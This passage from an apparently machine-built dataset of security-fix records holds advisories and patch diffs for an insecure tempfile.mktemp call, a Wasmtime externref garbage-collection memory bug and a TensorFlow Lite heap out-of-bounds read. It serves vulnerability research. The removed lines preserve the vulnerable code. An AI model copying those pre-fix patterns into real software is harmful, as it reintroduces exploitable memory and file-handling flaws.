            "code_diff":"@@ -287,7 +287,7 @@ def _filter_timestamps(tar_info):\n         tar_info.mtime = 0\n         return tar_info if custom_filter is None else custom_filter(tar_info)\n \n-    unzipped_filename = tempfile.mktemp()\n+    unzipped_file_handle, unzipped_filename = tempfile.mkstemp()\n     try:\n         with tarfile.open(unzipped_filename, \"w\") as tar:\n             tar.add(source_dir, arcname=archive_name, filter=_filter_timestamps)\n@@ -298,7 +298,7 @@ def _filter_timestamps(tar_info):\n         ) as gzipped_tar, open(unzipped_filename, \"rb\") as tar:\n             gzipped_tar.write(tar.read())\n     finally:\n-        os.remove(unzipped_filename)\n+        os.close(unzipped_file_handle)\n \n \n def _copy_project(src_path, dst_path=\"\"):"
        },
        {
            "index":938,
            "vuln_id":"GHSA-4873-36h9-wv49",
            "cwe_id":"{'CWE-787', 'CWE-125', 'CWE-590'}",
            "score":6.3,
            "chain":"{'https:\/\/github.com\/bytecodealliance\/wasmtime\/commit\/398a73f0dd862dbe703212ebae8e34036a18c11c'}",
            "dataset":"osv",
            "summary":"Out-of-bounds read\/write and invalid free with `externref`s and GC safepoints in Wasmtime  ### Impact\n\nThere was an invalid free and out-of-bounds read and write bug when running Wasm that uses `externref`s in Wasmtime.\n\nTo trigger this bug, Wasmtime needs to be running Wasm that uses `externref`s, the host creates non-null `externrefs`, Wasmtime performs a garbage collection (GC), and there has to be a Wasm frame on the stack that is at a GC safepoint where\n\n* there are no live references at this safepoint, and\n* there is a safepoint with live references earlier in this frame's function.\n\nUnder this scenario, Wasmtime would incorrectly use the GC stack map for the safepoint from earlier in the function instead of the empty safepoint. This would result in Wasmtime treating arbitrary stack slots as `externref`s that needed to be rooted for GC. At the *next* GC, it would be determined that nothing was referencing these bogus `externref`s (because nothing could ever reference them, because they are not really `externref`s) and then Wasmtime would deallocate them and run `<ExternRef as Drop>::drop` on them. This results in a free of memory that is not necessarily on the heap (and shouldn't be freed at this moment even if it was), as well as potential out-of-bounds reads and writes.\n\nEven though support for `externref`s (via the reference types proposal) is enabled by default, unless you are creating non-null `externref`s in your host code or explicitly triggering GCs, you cannot be affected by this bug.\n\nWe have reason to believe that the effective impact of this bug is relatively small because usage of `externref` is currently quite rare.\n\n### Patches\n\nThis bug has been patched and users should upgrade to Wasmtime version 0.30.0.\n\nAdditionally, we have updated [our primary `externref` fuzz target](https:\/\/github.com\/bytecodealliance\/wasmtime\/blob\/37c094faf53f1b356aab3c79d451395e4f7edb34\/fuzz\/fuzz_targets\/table_ops.rs) such that it better exercises these code paths and we can have greater confidence in their correctness going forward.\n\n### Workarounds\n\nIf you cannot upgrade Wasmtime at this time, you can avoid this bug by disabling the reference types proposal by passing `false` to [`wasmtime::Config::wasm_reference_types`](https:\/\/docs.rs\/wasmtime\/0.29.0\/wasmtime\/struct.Config.html#method.wasm_reference_types)\n\n### References\n\n* [The Wasm reference types proposal, which introduces `externref`](https:\/\/github.com\/WebAssembly\/reference-types\/)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Reach out to us on [the Bytecode Alliance Zulip chat](https:\/\/bytecodealliance.zulipchat.com\/#narrow\/stream\/217126-wasmtime)\n* Open an issue in [the `bytecodealliance\/wasmtime` repository](https:\/\/github.com\/bytecodealliance\/wasmtime\/)",
            "published_date":"2021-09-20",
            "chain_len":1,
            "project":"https:\/\/github.com\/bytecodealliance\/wasmtime",
            "commit_href":"https:\/\/github.com\/bytecodealliance\/wasmtime\/commit\/398a73f0dd862dbe703212ebae8e34036a18c11c",
            "commit_sha":"398a73f0dd862dbe703212ebae8e34036a18c11c",
            "patch":"SINGLE",
            "chain_ord":"['398a73f0dd862dbe703212ebae8e34036a18c11c']",
            "before_first_fix_commit":"{'ec4e48d4cbc28bcfd99e25842a90704e765b800f', '101998733b74624cbd348a2366d05760b40181f3'}",
            "last_fix_commit":"398a73f0dd862dbe703212ebae8e34036a18c11c",
            "chain_ord_pos":1.0,
            "commit_datetime":"09\/17\/2021, 17:28:50",
            "message":"Merge pull request from GHSA-4873-36h9-wv49\n\nStop doing fuzzy search for stack maps",
            "author":"Nick Fitzgerald",
            "comments":null,
            "stats":"{'additions': 52, 'deletions': 48, 'total': 100}",
            "files":"{'crates\/wasmtime\/src\/module\/registry.rs': {'additions': 52, 'deletions': 48, 'changes': 100, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/bytecodealliance\/wasmtime\/raw\/398a73f0dd862dbe703212ebae8e34036a18c11c\/crates%2Fwasmtime%2Fsrc%2Fmodule%2Fregistry.rs', 'patch': '@@ -122,61 +122,65 @@ impl ModuleInfo for RegisteredModule {\\n         let info = self.module.func_info(index);\\n \\n         \/\/ Do a binary search to find the stack map for the given offset.\\n-        \/\/\\n-        \/\/ Because GC safepoints are technically only associated with a single\\n-        \/\/ PC, we should ideally only care about `Ok(index)` values returned\\n-        \/\/ from the binary search. However, safepoints are inserted right before\\n-        \/\/ calls, and there are two things that can disturb the PC\/offset\\n-        \/\/ associated with the safepoint versus the PC we actually use to query\\n-        \/\/ for the stack map:\\n-        \/\/\\n-        \/\/ 1. The `backtrace` crate gives us the PC in a frame that will be\\n-        \/\/    *returned to*, and where execution will continue from, rather than\\n-        \/\/    the PC of the call we are currently at. So we would need to\\n-        \/\/    disassemble one instruction backwards to query the actual PC for\\n-        \/\/    the stack map.\\n-        \/\/\\n-        \/\/    TODO: One thing we *could* do to make this a little less error\\n-        \/\/    prone, would be to assert\/check that the nearest GC safepoint\\n-        \/\/    found is within `max_encoded_size(any kind of call instruction)`\\n-        \/\/    our queried PC for the target architecture.\\n-        \/\/\\n-        \/\/ 2. Cranelift\\'s stack maps only handle the stack, not\\n-        \/\/    registers. However, some references that are arguments to a call\\n-        \/\/    may need to be in registers. In these cases, what Cranelift will\\n-        \/\/    do is:\\n-        \/\/\\n-        \/\/      a. spill all the live references,\\n-        \/\/      b. insert a GC safepoint for those references,\\n-        \/\/      c. reload the references into registers, and finally\\n-        \/\/      d. make the call.\\n-        \/\/\\n-        \/\/    Step (c) adds drift between the GC safepoint and the location of\\n-        \/\/    the call, which is where we actually walk the stack frame and\\n-        \/\/    collect its live references.\\n-        \/\/\\n-        \/\/    Luckily, the spill stack slots for the live references are still\\n-        \/\/    up to date, so we can still find all the on-stack roots.\\n-        \/\/    Furthermore, we do not have a moving GC, so we don\\'t need to worry\\n-        \/\/    whether the following code will reuse the references in registers\\n-        \/\/    (which would not have been updated to point to the moved objects)\\n-        \/\/    or reload from the stack slots (which would have been updated to\\n-        \/\/    point to the moved objects).\\n-\\n         let index = match info\\n             .stack_maps\\n             .binary_search_by_key(&func_offset, |i| i.code_offset)\\n         {\\n-            \/\/ Exact hit.\\n+            \/\/ Found it.\\n             Ok(i) => i,\\n \\n-            \/\/ `Err(0)` means that the associated stack map would have been the\\n-            \/\/ first element in the array if this pc had an associated stack\\n-            \/\/ map, but this pc does not have an associated stack map. This can\\n-            \/\/ only happen inside a Wasm frame if there are no live refs at this\\n-            \/\/ pc.\\n+            \/\/ No stack map associated with this PC.\\n+            \/\/\\n+            \/\/ Because we know we are in Wasm code, and we must be at some kind\\n+            \/\/ of call\/safepoint, then the Cranelift backend must have avoided\\n+            \/\/ emitting a stack map for this location because no refs were live.\\n+            #[cfg(not(feature = \"old-x86-backend\"))]\\n+            Err(_) => return None,\\n+\\n+            \/\/ ### Old x86_64 backend specific code.\\n+            \/\/\\n+            \/\/ Because GC safepoints are technically only associated with a\\n+            \/\/ single PC, we should ideally only care about `Ok(index)` values\\n+            \/\/ returned from the binary search. However, safepoints are inserted\\n+            \/\/ right before calls, and there are two things that can disturb the\\n+            \/\/ PC\/offset associated with the safepoint versus the PC we actually\\n+            \/\/ use to query for the stack map:\\n+            \/\/\\n+            \/\/ 1. The `backtrace` crate gives us the PC in a frame that will be\\n+            \/\/    *returned to*, and where execution will continue from, rather than\\n+            \/\/    the PC of the call we are currently at. So we would need to\\n+            \/\/    disassemble one instruction backwards to query the actual PC for\\n+            \/\/    the stack map.\\n+            \/\/\\n+            \/\/    TODO: One thing we *could* do to make this a little less error\\n+            \/\/    prone, would be to assert\/check that the nearest GC safepoint\\n+            \/\/    found is within `max_encoded_size(any kind of call instruction)`\\n+            \/\/    our queried PC for the target architecture.\\n+            \/\/\\n+            \/\/ 2. Cranelift\\'s stack maps only handle the stack, not\\n+            \/\/    registers. However, some references that are arguments to a call\\n+            \/\/    may need to be in registers. In these cases, what Cranelift will\\n+            \/\/    do is:\\n+            \/\/\\n+            \/\/      a. spill all the live references,\\n+            \/\/      b. insert a GC safepoint for those references,\\n+            \/\/      c. reload the references into registers, and finally\\n+            \/\/      d. make the call.\\n+            \/\/\\n+            \/\/    Step (c) adds drift between the GC safepoint and the location of\\n+            \/\/    the call, which is where we actually walk the stack frame and\\n+            \/\/    collect its live references.\\n+            \/\/\\n+            \/\/    Luckily, the spill stack slots for the live references are still\\n+            \/\/    up to date, so we can still find all the on-stack roots.\\n+            \/\/    Furthermore, we do not have a moving GC, so we don\\'t need to worry\\n+            \/\/    whether the following code will reuse the references in registers\\n+            \/\/    (which would not have been updated to point to the moved objects)\\n+            \/\/    or reload from the stack slots (which would have been updated to\\n+            \/\/    point to the moved objects).\\n+            #[cfg(feature = \"old-x86-backend\")]\\n             Err(0) => return None,\\n-\\n+            #[cfg(feature = \"old-x86-backend\")]\\n             Err(i) => i - 1,\\n         };'}}",
            "message_norm":"merge pull request from ghsa-4873-36h9-wv49\n\nstop doing fuzzy search for stack maps",
            "language":"en",
            "entities":"[('ghsa-4873-36h9-wv49', 'VULNID', 'GHSA'), ('fuzzy', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['crates\/wasmtime\/src\/module\/registry.rs'])",
            "num_files":1.0,
            "patch_content":"From ec4e48d4cbc28bcfd99e25842a90704e765b800f Mon Sep 17 00:00:00 2001\nFrom: Nick Fitzgerald <fitzgen@gmail.com>\nDate: Wed, 1 Sep 2021 15:40:18 -0700\nSubject: [PATCH] Stop doing fuzzy search for stack maps\n\nThe new backends will not emit a stack map for a safepoint if there are zero\nlive references. Our fuzzy search for stack maps, which was necessary for the\nold backend, caused us to use the wrong stack map for some PCs which would in\nturn cause us to treat arbitrary stack slots as reference types pointers.\n---\n crates\/wasmtime\/src\/module\/registry.rs | 100 +++++++++++++------------\n 1 file changed, 52 insertions(+), 48 deletions(-)\n\ndiff --git a\/crates\/wasmtime\/src\/module\/registry.rs b\/crates\/wasmtime\/src\/module\/registry.rs\nindex 08ebacdbe78e..89f851c488bf 100644\n--- a\/crates\/wasmtime\/src\/module\/registry.rs\n+++ b\/crates\/wasmtime\/src\/module\/registry.rs\n@@ -122,61 +122,65 @@ impl ModuleInfo for RegisteredModule {\n         let info = self.module.func_info(index);\n \n         \/\/ Do a binary search to find the stack map for the given offset.\n-        \/\/\n-        \/\/ Because GC safepoints are technically only associated with a single\n-        \/\/ PC, we should ideally only care about `Ok(index)` values returned\n-        \/\/ from the binary search. However, safepoints are inserted right before\n-        \/\/ calls, and there are two things that can disturb the PC\/offset\n-        \/\/ associated with the safepoint versus the PC we actually use to query\n-        \/\/ for the stack map:\n-        \/\/\n-        \/\/ 1. The `backtrace` crate gives us the PC in a frame that will be\n-        \/\/    *returned to*, and where execution will continue from, rather than\n-        \/\/    the PC of the call we are currently at. So we would need to\n-        \/\/    disassemble one instruction backwards to query the actual PC for\n-        \/\/    the stack map.\n-        \/\/\n-        \/\/    TODO: One thing we *could* do to make this a little less error\n-        \/\/    prone, would be to assert\/check that the nearest GC safepoint\n-        \/\/    found is within `max_encoded_size(any kind of call instruction)`\n-        \/\/    our queried PC for the target architecture.\n-        \/\/\n-        \/\/ 2. Cranelift's stack maps only handle the stack, not\n-        \/\/    registers. However, some references that are arguments to a call\n-        \/\/    may need to be in registers. In these cases, what Cranelift will\n-        \/\/    do is:\n-        \/\/\n-        \/\/      a. spill all the live references,\n-        \/\/      b. insert a GC safepoint for those references,\n-        \/\/      c. reload the references into registers, and finally\n-        \/\/      d. make the call.\n-        \/\/\n-        \/\/    Step (c) adds drift between the GC safepoint and the location of\n-        \/\/    the call, which is where we actually walk the stack frame and\n-        \/\/    collect its live references.\n-        \/\/\n-        \/\/    Luckily, the spill stack slots for the live references are still\n-        \/\/    up to date, so we can still find all the on-stack roots.\n-        \/\/    Furthermore, we do not have a moving GC, so we don't need to worry\n-        \/\/    whether the following code will reuse the references in registers\n-        \/\/    (which would not have been updated to point to the moved objects)\n-        \/\/    or reload from the stack slots (which would have been updated to\n-        \/\/    point to the moved objects).\n-\n         let index = match info\n             .stack_maps\n             .binary_search_by_key(&func_offset, |i| i.code_offset)\n         {\n-            \/\/ Exact hit.\n+            \/\/ Found it.\n             Ok(i) => i,\n \n-            \/\/ `Err(0)` means that the associated stack map would have been the\n-            \/\/ first element in the array if this pc had an associated stack\n-            \/\/ map, but this pc does not have an associated stack map. This can\n-            \/\/ only happen inside a Wasm frame if there are no live refs at this\n-            \/\/ pc.\n+            \/\/ No stack map associated with this PC.\n+            \/\/\n+            \/\/ Because we know we are in Wasm code, and we must be at some kind\n+            \/\/ of call\/safepoint, then the Cranelift backend must have avoided\n+            \/\/ emitting a stack map for this location because no refs were live.\n+            #[cfg(not(feature = \"old-x86-backend\"))]\n+            Err(_) => return None,\n+\n+            \/\/ ### Old x86_64 backend specific code.\n+            \/\/\n+            \/\/ Because GC safepoints are technically only associated with a\n+            \/\/ single PC, we should ideally only care about `Ok(index)` values\n+            \/\/ returned from the binary search. However, safepoints are inserted\n+            \/\/ right before calls, and there are two things that can disturb the\n+            \/\/ PC\/offset associated with the safepoint versus the PC we actually\n+            \/\/ use to query for the stack map:\n+            \/\/\n+            \/\/ 1. The `backtrace` crate gives us the PC in a frame that will be\n+            \/\/    *returned to*, and where execution will continue from, rather than\n+            \/\/    the PC of the call we are currently at. So we would need to\n+            \/\/    disassemble one instruction backwards to query the actual PC for\n+            \/\/    the stack map.\n+            \/\/\n+            \/\/    TODO: One thing we *could* do to make this a little less error\n+            \/\/    prone, would be to assert\/check that the nearest GC safepoint\n+            \/\/    found is within `max_encoded_size(any kind of call instruction)`\n+            \/\/    our queried PC for the target architecture.\n+            \/\/\n+            \/\/ 2. Cranelift's stack maps only handle the stack, not\n+            \/\/    registers. However, some references that are arguments to a call\n+            \/\/    may need to be in registers. In these cases, what Cranelift will\n+            \/\/    do is:\n+            \/\/\n+            \/\/      a. spill all the live references,\n+            \/\/      b. insert a GC safepoint for those references,\n+            \/\/      c. reload the references into registers, and finally\n+            \/\/      d. make the call.\n+            \/\/\n+            \/\/    Step (c) adds drift between the GC safepoint and the location of\n+            \/\/    the call, which is where we actually walk the stack frame and\n+            \/\/    collect its live references.\n+            \/\/\n+            \/\/    Luckily, the spill stack slots for the live references are still\n+            \/\/    up to date, so we can still find all the on-stack roots.\n+            \/\/    Furthermore, we do not have a moving GC, so we don't need to worry\n+            \/\/    whether the following code will reuse the references in registers\n+            \/\/    (which would not have been updated to point to the moved objects)\n+            \/\/    or reload from the stack slots (which would have been updated to\n+            \/\/    point to the moved objects).\n+            #[cfg(feature = \"old-x86-backend\")]\n             Err(0) => return None,\n-\n+            #[cfg(feature = \"old-x86-backend\")]\n             Err(i) => i - 1,\n         };",
            "code_diff":"@@ -122,61 +122,65 @@ impl ModuleInfo for RegisteredModule {\n         let info = self.module.func_info(index);\n \n         \/\/ Do a binary search to find the stack map for the given offset.\n-        \/\/\n-        \/\/ Because GC safepoints are technically only associated with a single\n-        \/\/ PC, we should ideally only care about `Ok(index)` values returned\n-        \/\/ from the binary search. However, safepoints are inserted right before\n-        \/\/ calls, and there are two things that can disturb the PC\/offset\n-        \/\/ associated with the safepoint versus the PC we actually use to query\n-        \/\/ for the stack map:\n-        \/\/\n-        \/\/ 1. The `backtrace` crate gives us the PC in a frame that will be\n-        \/\/    *returned to*, and where execution will continue from, rather than\n-        \/\/    the PC of the call we are currently at. So we would need to\n-        \/\/    disassemble one instruction backwards to query the actual PC for\n-        \/\/    the stack map.\n-        \/\/\n-        \/\/    TODO: One thing we *could* do to make this a little less error\n-        \/\/    prone, would be to assert\/check that the nearest GC safepoint\n-        \/\/    found is within `max_encoded_size(any kind of call instruction)`\n-        \/\/    our queried PC for the target architecture.\n-        \/\/\n-        \/\/ 2. Cranelift's stack maps only handle the stack, not\n-        \/\/    registers. However, some references that are arguments to a call\n-        \/\/    may need to be in registers. In these cases, what Cranelift will\n-        \/\/    do is:\n-        \/\/\n-        \/\/      a. spill all the live references,\n-        \/\/      b. insert a GC safepoint for those references,\n-        \/\/      c. reload the references into registers, and finally\n-        \/\/      d. make the call.\n-        \/\/\n-        \/\/    Step (c) adds drift between the GC safepoint and the location of\n-        \/\/    the call, which is where we actually walk the stack frame and\n-        \/\/    collect its live references.\n-        \/\/\n-        \/\/    Luckily, the spill stack slots for the live references are still\n-        \/\/    up to date, so we can still find all the on-stack roots.\n-        \/\/    Furthermore, we do not have a moving GC, so we don't need to worry\n-        \/\/    whether the following code will reuse the references in registers\n-        \/\/    (which would not have been updated to point to the moved objects)\n-        \/\/    or reload from the stack slots (which would have been updated to\n-        \/\/    point to the moved objects).\n-\n         let index = match info\n             .stack_maps\n             .binary_search_by_key(&func_offset, |i| i.code_offset)\n         {\n-            \/\/ Exact hit.\n+            \/\/ Found it.\n             Ok(i) => i,\n \n-            \/\/ `Err(0)` means that the associated stack map would have been the\n-            \/\/ first element in the array if this pc had an associated stack\n-            \/\/ map, but this pc does not have an associated stack map. This can\n-            \/\/ only happen inside a Wasm frame if there are no live refs at this\n-            \/\/ pc.\n+            \/\/ No stack map associated with this PC.\n+            \/\/\n+            \/\/ Because we know we are in Wasm code, and we must be at some kind\n+            \/\/ of call\/safepoint, then the Cranelift backend must have avoided\n+            \/\/ emitting a stack map for this location because no refs were live.\n+            #[cfg(not(feature = \"old-x86-backend\"))]\n+            Err(_) => return None,\n+\n+            \/\/ ### Old x86_64 backend specific code.\n+            \/\/\n+            \/\/ Because GC safepoints are technically only associated with a\n+            \/\/ single PC, we should ideally only care about `Ok(index)` values\n+            \/\/ returned from the binary search. However, safepoints are inserted\n+            \/\/ right before calls, and there are two things that can disturb the\n+            \/\/ PC\/offset associated with the safepoint versus the PC we actually\n+            \/\/ use to query for the stack map:\n+            \/\/\n+            \/\/ 1. The `backtrace` crate gives us the PC in a frame that will be\n+            \/\/    *returned to*, and where execution will continue from, rather than\n+            \/\/    the PC of the call we are currently at. So we would need to\n+            \/\/    disassemble one instruction backwards to query the actual PC for\n+            \/\/    the stack map.\n+            \/\/\n+            \/\/    TODO: One thing we *could* do to make this a little less error\n+            \/\/    prone, would be to assert\/check that the nearest GC safepoint\n+            \/\/    found is within `max_encoded_size(any kind of call instruction)`\n+            \/\/    our queried PC for the target architecture.\n+            \/\/\n+            \/\/ 2. Cranelift's stack maps only handle the stack, not\n+            \/\/    registers. However, some references that are arguments to a call\n+            \/\/    may need to be in registers. In these cases, what Cranelift will\n+            \/\/    do is:\n+            \/\/\n+            \/\/      a. spill all the live references,\n+            \/\/      b. insert a GC safepoint for those references,\n+            \/\/      c. reload the references into registers, and finally\n+            \/\/      d. make the call.\n+            \/\/\n+            \/\/    Step (c) adds drift between the GC safepoint and the location of\n+            \/\/    the call, which is where we actually walk the stack frame and\n+            \/\/    collect its live references.\n+            \/\/\n+            \/\/    Luckily, the spill stack slots for the live references are still\n+            \/\/    up to date, so we can still find all the on-stack roots.\n+            \/\/    Furthermore, we do not have a moving GC, so we don't need to worry\n+            \/\/    whether the following code will reuse the references in registers\n+            \/\/    (which would not have been updated to point to the moved objects)\n+            \/\/    or reload from the stack slots (which would have been updated to\n+            \/\/    point to the moved objects).\n+            #[cfg(feature = \"old-x86-backend\")]\n             Err(0) => return None,\n-\n+            #[cfg(feature = \"old-x86-backend\")]\n             Err(i) => i - 1,\n         };"
        },
        {
            "index":350,
            "vuln_id":"GHSA-24x6-8c7m-hv3f",
            "cwe_id":"{'CWE-125'}",
            "score":2.5,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/953f28dca13c92839ba389c055587cfe6c723578'}",
            "dataset":"osv",
            "summary":"Heap OOB read in TFLite's implementation of `Minimum` or `Maximum` ### Impact\nThe implementations of the `Minimum` and `Maximum` TFLite operators can be used to read data outside of bounds of heap allocated objects, if any of the two input tensor arguments are empty.\n\nThis is because [the broadcasting implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7\/tensorflow\/lite\/kernels\/internal\/reference\/maximum_minimum.h#L52-L56) indexes in both tensors with the same index but does not validate that the index is within bounds:\n\n```cc\nauto maxmin_func = [&](int indexes[N]) {\n  output_data[SubscriptToIndex(output_desc, indexes)] =\n    op(input1_data[SubscriptToIndex(desc1, indexes)],\n        input2_data[SubscriptToIndex(desc2, indexes)]);\n};\n```\n\n### Patches\nWe have patched the issue in GitHub commit [953f28dca13c92839ba389c055587cfe6c723578](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/953f28dca13c92839ba389c055587cfe6c723578).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
            "published_date":"2021-05-21",
            "chain_len":1,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/953f28dca13c92839ba389c055587cfe6c723578",
            "commit_sha":"953f28dca13c92839ba389c055587cfe6c723578",
            "patch":"SINGLE",
            "chain_ord":"['953f28dca13c92839ba389c055587cfe6c723578']",
            "before_first_fix_commit":"{'801c1c6be5324219689c98e1bd3e0ca365ee834d'}",
            "last_fix_commit":"953f28dca13c92839ba389c055587cfe6c723578",
            "chain_ord_pos":1.0,
            "commit_datetime":"04\/28\/2021, 00:46:38",
            "message":"Prevent a null pointer exception in TFLite\n\nPiperOrigin-RevId: 370800206\nChange-Id: Idd437ebce4ff224120d8eefc1c14c062173b71d6",
            "author":"Mihai Maruseac",
            "comments":null,
            "stats":"{'additions': 31, 'deletions': 29, 'total': 60}",
            "files":"{'tensorflow\/lite\/kernels\/maximum_minimum.cc': {'additions': 31, 'deletions': 29, 'changes': 60, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/953f28dca13c92839ba389c055587cfe6c723578\/tensorflow%2Flite%2Fkernels%2Fmaximum_minimum.cc', 'patch': '@@ -157,35 +157,37 @@ template <KernelType kernel_type, typename OpType>\\n TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\\n   OpContext op_context(context, node);\\n \\n-    switch (op_context.output->type) {\\n-      case kTfLiteFloat32:\\n-        TFLiteOperation<kernel_type, float, OpType>(context, node, op_context);\\n-        break;\\n-      case kTfLiteUInt8:\\n-        TFLiteOperation<kernel_type, uint8_t, OpType>(context, node,\\n-                                                      op_context);\\n-        break;\\n-      case kTfLiteInt8:\\n-        TFLiteOperation<kernel_type, int8_t, OpType>(context, node, op_context);\\n-        break;\\n-      case kTfLiteInt32:\\n-        TFLiteOperation<kernel_type, int32_t, OpType>(context, node,\\n-                                                      op_context);\\n-        break;\\n-      case kTfLiteInt64:\\n-        TFLiteOperation<kernel_type, int64_t, OpType>(context, node,\\n-                                                      op_context);\\n-        break;\\n-      case kTfLiteInt16:\\n-        TFLiteOperation<kernel_type, int16_t, OpType>(context, node,\\n-                                                      op_context);\\n-        break;\\n-      default:\\n-        context->ReportError(context,\\n-                             \"Type %d is currently not supported by Maximum.\",\\n-                             op_context.output->type);\\n-        return kTfLiteError;\\n-    }\\n+  \/\/ If inputs have no element, shortcircuit.\\n+  if (NumElements(op_context.input1) == 0 ||\\n+      NumElements(op_context.input2) == 0) {\\n+    return kTfLiteOk;\\n+  }\\n+\\n+  switch (op_context.output->type) {\\n+    case kTfLiteFloat32:\\n+      TFLiteOperation<kernel_type, float, OpType>(context, node, op_context);\\n+      break;\\n+    case kTfLiteUInt8:\\n+      TFLiteOperation<kernel_type, uint8_t, OpType>(context, node, op_context);\\n+      break;\\n+    case kTfLiteInt8:\\n+      TFLiteOperation<kernel_type, int8_t, OpType>(context, node, op_context);\\n+      break;\\n+    case kTfLiteInt32:\\n+      TFLiteOperation<kernel_type, int32_t, OpType>(context, node, op_context);\\n+      break;\\n+    case kTfLiteInt64:\\n+      TFLiteOperation<kernel_type, int64_t, OpType>(context, node, op_context);\\n+      break;\\n+    case kTfLiteInt16:\\n+      TFLiteOperation<kernel_type, int16_t, OpType>(context, node, op_context);\\n+      break;\\n+    default:\\n+      context->ReportError(context,\\n+                           \"Type %d is currently not supported by Maximum.\",\\n+                           op_context.output->type);\\n+      return kTfLiteError;\\n+  }\\n   return kTfLiteOk;\\n }'}}",
            "message_norm":"prevent a null pointer exception in tflite\n\npiperorigin-revid: 370800206\nchange-id: idd437ebce4ff224120d8eefc1c14c062173b71d6",
            "language":"en",
            "entities":"[('prevent', 'ACTION', ''), ('null pointer exception', 'SECWORD', ''), ('370800206', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/lite\/kernels\/maximum_minimum.cc'])",
            "num_files":1.0,
            "patch_content":"From 953f28dca13c92839ba389c055587cfe6c723578 Mon Sep 17 00:00:00 2001\nFrom: Mihai Maruseac <mihaimaruseac@google.com>\nDate: Tue, 27 Apr 2021 17:46:38 -0700\nSubject: [PATCH] Prevent a null pointer exception in TFLite\n\nPiperOrigin-RevId: 370800206\nChange-Id: Idd437ebce4ff224120d8eefc1c14c062173b71d6\n---\n tensorflow\/lite\/kernels\/maximum_minimum.cc | 60 +++++++++++-----------\n 1 file changed, 31 insertions(+), 29 deletions(-)\n\ndiff --git a\/tensorflow\/lite\/kernels\/maximum_minimum.cc b\/tensorflow\/lite\/kernels\/maximum_minimum.cc\nindex 777e51442f120e..176e020a5a8e55 100644\n--- a\/tensorflow\/lite\/kernels\/maximum_minimum.cc\n+++ b\/tensorflow\/lite\/kernels\/maximum_minimum.cc\n@@ -157,35 +157,37 @@ template <KernelType kernel_type, typename OpType>\n TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\n   OpContext op_context(context, node);\n \n-    switch (op_context.output->type) {\n-      case kTfLiteFloat32:\n-        TFLiteOperation<kernel_type, float, OpType>(context, node, op_context);\n-        break;\n-      case kTfLiteUInt8:\n-        TFLiteOperation<kernel_type, uint8_t, OpType>(context, node,\n-                                                      op_context);\n-        break;\n-      case kTfLiteInt8:\n-        TFLiteOperation<kernel_type, int8_t, OpType>(context, node, op_context);\n-        break;\n-      case kTfLiteInt32:\n-        TFLiteOperation<kernel_type, int32_t, OpType>(context, node,\n-                                                      op_context);\n-        break;\n-      case kTfLiteInt64:\n-        TFLiteOperation<kernel_type, int64_t, OpType>(context, node,\n-                                                      op_context);\n-        break;\n-      case kTfLiteInt16:\n-        TFLiteOperation<kernel_type, int16_t, OpType>(context, node,\n-                                                      op_context);\n-        break;\n-      default:\n-        context->ReportError(context,\n-                             \"Type %d is currently not supported by Maximum.\",\n-                             op_context.output->type);\n-        return kTfLiteError;\n-    }\n+  \/\/ If inputs have no element, shortcircuit.\n+  if (NumElements(op_context.input1) == 0 ||\n+      NumElements(op_context.input2) == 0) {\n+    return kTfLiteOk;\n+  }\n+\n+  switch (op_context.output->type) {\n+    case kTfLiteFloat32:\n+      TFLiteOperation<kernel_type, float, OpType>(context, node, op_context);\n+      break;\n+    case kTfLiteUInt8:\n+      TFLiteOperation<kernel_type, uint8_t, OpType>(context, node, op_context);\n+      break;\n+    case kTfLiteInt8:\n+      TFLiteOperation<kernel_type, int8_t, OpType>(context, node, op_context);\n+      break;\n+    case kTfLiteInt32:\n+      TFLiteOperation<kernel_type, int32_t, OpType>(context, node, op_context);\n+      break;\n+    case kTfLiteInt64:\n+      TFLiteOperation<kernel_type, int64_t, OpType>(context, node, op_context);\n+      break;\n+    case kTfLiteInt16:\n+      TFLiteOperation<kernel_type, int16_t, OpType>(context, node, op_context);\n+      break;\n+    default:\n+      context->ReportError(context,\n+                           \"Type %d is currently not supported by Maximum.\",\n+                           op_context.output->type);\n+      return kTfLiteError;\n+  }\n   return kTfLiteOk;\n }",
            "code_diff":"@@ -157,35 +157,37 @@ template <KernelType kernel_type, typename OpType>\n TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\n   OpContext op_context(context, node);\n \n-    switch (op_context.output->type) {\n-      case kTfLiteFloat32:\n-        TFLiteOperation<kernel_type, float, OpType>(context, node, op_context);\n-        break;\n-      case kTfLiteUInt8:\n-        TFLiteOperation<kernel_type, uint8_t, OpType>(context, node,\n-                                                      op_context);\n-        break;\n-      case kTfLiteInt8:\n-        TFLiteOperation<kernel_type, int8_t, OpType>(context, node, op_context);\n-        break;\n-      case kTfLiteInt32:\n-        TFLiteOperation<kernel_type, int32_t, OpType>(context, node,\n-                                                      op_context);\n-        break;\n-      case kTfLiteInt64:\n-        TFLiteOperation<kernel_type, int64_t, OpType>(context, node,\n-                                                      op_context);\n-        break;\n-      case kTfLiteInt16:\n-        TFLiteOperation<kernel_type, int16_t, OpType>(context, node,\n-                                                      op_context);\n-        break;\n-      default:\n-        context->ReportError(context,\n-                             \"Type %d is currently not supported by Maximum.\",\n-                             op_context.output->type);\n-        return kTfLiteError;\n-    }\n+  \/\/ If inputs have no element, shortcircuit.\n+  if 